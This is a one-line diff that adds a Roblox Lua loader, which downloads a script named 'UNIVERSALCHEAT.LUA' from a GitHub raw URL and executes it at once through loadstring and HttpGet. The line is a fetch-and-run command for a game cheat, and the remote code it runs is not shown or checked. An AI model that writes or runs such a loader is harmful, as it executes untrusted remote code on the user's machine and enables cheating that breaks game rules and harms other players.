@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/paradoxhubv2/paradoxhub/main/UNIVERSALCHEAT.LUA",true))()
